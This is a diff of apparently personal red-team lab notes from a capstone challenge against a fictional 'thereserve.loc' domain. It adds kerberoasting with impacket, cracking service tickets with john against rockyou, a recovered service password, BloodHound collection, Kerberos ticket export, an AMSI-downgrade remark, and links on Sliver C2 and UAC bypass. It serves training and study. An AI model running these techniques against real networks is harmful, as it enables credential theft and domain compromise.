@@ -5,7 +5,7 @@ Date:
 Difficulty:  Hard
 Goals:  
 - Red Teaming with the any Community 
-	- Subbed to 0xTiberious
+	- Subbed to 0xTiberious, Tyler Ramsbey
 	- Joined the Work Harder Group
 - Get as many feasible perspectives and tricks
 - Watch the speed run 
@@ -16,7 +16,9 @@ Learnt:
 - Setup Local Email for Red Reasons
 - AlH4zr3d's Phishing and Spearphishing SE leafy-bug strategy 
 - `fping` is better than `ping`
+- ScareCrow
 - Sliver is awesome
+- C2 Workflow
 
 
 
@@ -460,11 +462,7 @@ xsel -b > WRK1-sc-qc.output
 
 ![](foundthebackupservice.png)
 
-Sadly I got 193 error meaning that I could perform the path hijack and the serviceName service outputs error 5 meaning I need administrator
-
-
-[seatbelt commmands](https://github.com/GhostPack/Seatbelt)
-
+Sadly I got 193 error meaning that I could perform the path hijack and the serviceName service outputs error 5 meaning I need administrator.  Some [seatbelt commmands](https://github.com/GhostPack/Seatbelt)
 ```go
 // 
 seatbelt -h 
@@ -483,6 +481,7 @@ seatbelt powershell // We can downgrade to bypass AMSI
 ```
 
 #### Just checking
+
 ![](wrk1system32icacls.png)
 
 #### What we can do
@@ -501,13 +500,46 @@ seatbelt powershell // We can downgrade to bypass AMSI
 At this point I went over my Bloodhound information, then kerberoasted svc accounts.
 
 [Hashcat 13100](https://hashcat.net/wiki/doku.php?id=example_hashes) or krb5tgs with john
-```
+```bash
 sudo apt install ntpdate
 sudo ntpdate $dc_ip
 
-john hash --format=krb5tgs   /usr/share/wordlists/rockyou.txt
+john hash --format=krb5tgs /usr/share/wordlists/rockyou.txt
 - Password1!
 ```
+
+
+
+#### Return for Cthulu Cthursday
+
+
+Returning the day after because of work with [Al](https://www.twitch.tv/videos/1829218217), [Tyler Ramsbey Part 4](https://www.youtube.com/watch?v=qr8eGM1zhV8) and [Tyler Ramsbey Part 5](https://www.youtube.com/watch?v=FRUQMg9IhMA) in the background 
+```bash
+proxychains4 impacket-GetUserSPNs -dc-ip 10.200.119.102 -request 'corp.thereserve.loc/mohammad.ahmed' -outputfile krbs-2/corp.spns
+# Extract usernames
+cat corp.spns | awk -F$ '{print $4}' | sed 's/*//g' >> ~/RedTeamCapStoneChallenge/lists/users.txt
+
+svcScanning : Password1!
+
+proxychains4 python3 /opt/BloodHound.py/bloodhound.y --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.102 -u 'svcScanning' -p 'Password1!'
+
+impacket-ticketConverter $ticket.ccache $ticket.kirbi
+
+export KRB5CCNAME=$(pwd)/$ticket.ccache
+```
+
+My Bloodhound data was very different so I ran it again..but then we can psremote into server01!
+![](wecanpsremoteintoserver1.png)
+
+
+https://redsiege.com/blog/2022/11/introduction-to-sliver/
+https://seamlessintelligence.com.au/sliver_1.html
+https://seamlessintelligence.com.au/sliver_2.html
+https://seamlessintelligence.com.au/sliver_3.html
+https://tishina.in/opsec/sliver-opsec-notes#implant%20obfuscation%20and%20export%20formats
+https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
+https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
+
 
 
 ## Full Compromise of CORP Domain
